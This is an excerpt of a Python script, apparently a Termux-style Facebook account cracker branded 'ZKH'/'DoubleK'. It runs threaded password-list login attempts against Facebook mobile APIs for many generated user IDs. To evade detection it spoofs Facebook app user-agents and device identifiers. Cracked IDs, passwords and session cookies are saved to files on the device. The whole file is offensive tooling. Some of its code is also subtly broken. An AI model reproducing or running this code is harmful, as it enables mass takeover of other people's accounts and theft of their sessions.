...
def pak():
		...
		for nmbr in range(limit):
			...
			user.append(nmp)
		with tred(max_workers=30) as ZKH:	
			clear()
			tl = str(len(user))
			...
			for psx in user:
				...
				if mthd in ['1','01']:
					ZKH.submit(ZKH1,ids,passlist)
				if mthd in ['2','02']:
					ZKH.submit(ZKH2,ids,passlist)
				if mthd in ['3','03']:
					ZKH.submit(ZKH3,ids,passlist)
				if mthd in ['4','04']:
					ZKH.submit(ZKH4,ids,passlist)
				if mthd in ['5','05']:
					ZKH.submit(ZKH5,ids,passlist)
				if mthd in ['6','06']:
					ZKH.submit(ZKH6,ids,passlist)
		print('\033[1;37m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
def api1(ids,names,passlist):
		try:
			global ok,loop
			sys.stdout.write('\r\r\033[1;37m [ZKH-M1] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			fn = names.split(' ')[0]
			try:
				ln = names.split(' ')[1]
			except:
			...
			for pw in passlist:
				...
				_string = f'{str(dvlk)} [FBAN/FB4A;FBAV/{str(application_version)};FBPN/com.facebook.katana;FBLC/en_PK;FBCR/null;FBBV/{str(application_version_code)};FBMF/{str(phone_company)};FBBD/{str(phone_company)};FBDV/{str(phone_company)};FBSV/8.1.0;;FBDM/'+'{density=2.75,height=1440,width=720};]'
				li = ['28','29','210']
				...
				'x-fb-connection-qlity':'EXCELLENT',
				...
				q = json.loads(po)
				if 'session_key' in q:
					print('\r\r\033[1;32m [ZKH-OK] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/ZKH-OK.txt','a').write(ids+'|'+pas+'\n')
					oks.append(ids)
					break
				elif 'www.facebook.com' in q['error_msg']:
					if 'y' in pcp:
						print('\r\r\x1b[38;5;205m [ZKH-CP] '+ids+' | '+pas+'\033[1;97m')
						open('/sdcard/ZKH-CP.txt','a').write(ids+'|'+pas+'\n')
						cps.append(ids)
						break
					else:
						open('/sdcard/ZKH-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [ZKH-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        ua=random.choice(["[Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36:;]","[FBAN/FB4A;FBAV/917.0.0.88.183;FBBV/906395158;FBDM/{density=2.0,width=1717,height=1468};FBLC/en_GB;FBRV/286820064;FBCR/Ooredoo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-A047F;FBSV/12;FBOP/16;FBCA/arm64-v8a:;]","[Mozilla/5.0 (Linux; Android 12; 2201116SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36]","[Mozilla/5.0 (Linux; Android 13; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36]","[Mozilla/5.0 (Linux; Android 7.0; SM-T827R4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Safari/537.36:;"])
                        ...
                        if 'session_key' in po:
                                        ...
                                        open('/sdcard/ZKH-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/ZKH-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[ZKH-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
...
def api3(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [ZKH-M3] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
"Content-Length": "329",}
                        ...
                        if 'session_key' in po:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("Cookie: "+coki)
                                        open('/sdcard/ZKH-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/ZKH-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
...
def api4(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [ZKH-M4] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        ua= random.choice(["[FBAN/FB4A;FBAV/433.0.0.61.154;FBBV/414288652;FBDM/{density=2.0,width=1084,height=2927};FBLC/en_GB;FBRV/499563483;FBCR/Mpt;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N930A;FBSV/15;FBOP/20;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/917.0.0.88.183;FBBV/906395158;FBDM/{density=2.0,width=1717,height=1468};FBLC/en_GB;FBRV/286820064;FBCR/Ooredoo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-A047F;FBSV/12;FBOP/16;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/917.0.0.88.183;FBBV/906395158;FBDM/{density=2.0,width=1717,height=1468};FBLC/en_GB;FBRV/286820064;FBCR/Ooredoo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-A047F;FBSV/12;FBOP/16;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/992.0.0.34.531;FBBV/391407683;FBDM/{density=2.0,width=2059,height=3689};FBLC/en_US;FBRV/844395985;FBCR/Telenor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A047F/DS;FBSV/8;FBOP/6;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/258.0.0.94.237;FBBV/831824052;FBDM/{density=2.0,width=800,height=1971};FBLC/en_GB;FBRV/813280253;FBCR/null;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG EK-GN120;FBSV/11;FBOP/3;FBCA/arm64-v8a:;"])
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;206m [ZKH-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/ZKH-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
...
def api5(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write('\r\r\033[1;37m [ZKH-M5] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def api6(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [ZKH-M6] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			ZKH=session.cookies.get_dict().keys()
			if "c_user" in ZKH:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\r\r\033[1;32m [ZKH-OK] %s | %s'%(ids,pas))
				open('/sdcard/ZKH-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in ZKH:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;205m [ZKH-CP] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/ZKH-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
...
def api7(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [ZKH-M7] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
def api8(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m [ZKH-M8] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
...
'Content-Length': '698'}
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [ZKH-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ZKH-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;205m [ZKH-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ZKH-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def ZKH2(ids,passlist):
	...
	try:
		for pas in passlist:
			...
			_string = 'Dalvik/2.1.0 (Linux; U; Android 10; Infinix X690B Build/QP1A.190711.020) [FBAN/MobileAdsManagerAndroid;FBAV/236.0.0.24.108;FBBV/405428495;FBRV/0;FBLC/en_US;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X690B;FBSV/10;FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/{density=2.97,width=720,height=1612};FB_FW/1;]'
			device_family_id = str(uuid.uuid4())
			adid = str(uuid.uuid4())
			machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
			data = {'adid':adid,
			...
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [ZKH-OK] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/ZKH-rnd-OK.txt', 'a').write(udx+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'www.facebook.com' in q['error_msg']:
				print('\r\r\x1b[38;5;205m [ZKH-CP] '+ids+' | '+pas+'\033[1;97m')
				open('/sdcard/ZKH-rnd-CP.txt','a').write(ids+'|'+pas+'\n')
				cps.append(ids)
				break
			else:
				continue
...
def ZKH3(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        #open('/sdcard/ZKH-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/ZKH-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                ...
                pass
#method4
def ZKH4(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [ZKH-M4] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
...
def ZKH5(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [DoubleK-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ZKH-rnd-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;205m [DoubleK-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/ZKH-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                ...
                pass
#method6
def ZKH6(ids,passlist):
	global loop
	global oks
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;37m [DoubleK-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
			session = requests.Session()
			ua= random.choice(["[FBAN/FB4A;FBAV/433.0.0.61.154;FBBV/414288652;FBDM/{density=2.0,width=1084,height=2927};FBLC/en_GB;FBRV/499563483;FBCR/Mpt;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N930A;FBSV/15;FBOP/20;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/917.0.0.88.183;FBBV/906395158;FBDM/{density=2.0,width=1717,height=1468};FBLC/en_GB;FBRV/286820064;FBCR/Ooredoo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-A047F;FBSV/12;FBOP/16;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/917.0.0.88.183;FBBV/906395158;FBDM/{density=2.0,width=1717,height=1468};FBLC/en_GB;FBRV/286820064;FBCR/Ooredoo;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.orca;FBDV/SM-A047F;FBSV/12;FBOP/16;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/992.0.0.34.531;FBBV/391407683;FBDM/{density=2.0,width=2059,height=3689};FBLC/en_US;FBRV/844395985;FBCR/Telenor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A047F/DS;FBSV/8;FBOP/6;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/258.0.0.94.237;FBBV/831824052;FBDM/{density=2.0,width=800,height=1971};FBLC/en_GB;FBRV/813280253;FBCR/null;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SAMSUNG EK-GN120;FBSV/11;FBOP/3;FBCA/arm64-v8a:;"])
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						print('\r\r\033[1;34m [DoubleK-2F] '+uid+' | '+pas)
					else:
						print(f'\r\x1b[1;32m [DoubleK-OK] '+uid+' | '+pas)
						open('/sdcard/ZKH-rnd-OK.txt', 'a').write(uid+'|'+pas+'\n')
						oks.append(uid)
						break
				...
				if uid in cps:pass
					...
					print('\r\r\x1b[38;5;205m [ZKH-CP] '+uid+' | '+pas+'\033[1;97m')
					open('/sdcard/ZKH-rnd-CP.txt', 'a').write(uid+'|'+pas+'\n')
					cps.append(ids)
					break
			else:
				continue
